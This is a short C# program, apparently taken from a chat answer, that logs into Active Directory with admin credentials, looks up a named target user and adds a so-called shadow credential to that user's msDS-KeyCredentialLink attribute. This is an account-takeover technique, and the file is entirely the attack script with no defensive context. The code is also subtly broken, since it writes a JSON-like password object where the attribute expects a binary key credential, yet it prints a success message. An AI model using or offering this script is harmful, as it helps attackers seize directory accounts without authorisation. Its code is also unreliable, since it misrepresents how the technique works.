using System.DirectoryServices;

class Program
{
    static void Main()
    {
        string domain = "yourdomain.com";
        string username = "targetuser";
        string password = "shadowpassword";

        using (DirectoryEntry entry = new DirectoryEntry($"LDAP://{domain}/CN=Users,DC={domain.Split('.')[0]},DC=com", "adminusername", "adminpassword"))
        {
            DirectorySearcher searcher = new DirectorySearcher(entry);
            searcher.Filter = $"(&(objectClass=user)(sAMAccountName={username}))";
            SearchResult result = searcher.FindOne();

            if (result != null)
            {
                DirectoryEntry userEntry = result.GetDirectoryEntry();
                string keyCredentialLink = "msDS-KeyCredentialLink";
                string keyCredentialObject = @"{{
                    'type': 'password',
                    'value': '{0}',
                    'description': 'Shadow Credential'
                }}".Replace("{0}", password);

                userEntry.Properties[keyCredentialLink].Add(keyCredentialObject);
                userEntry.CommitChanges();
                Console.WriteLine("Shadow credential added successfully.");
            }
            else
            {
                Console.WriteLine("User not found.");
            }
        }
    }
}
```

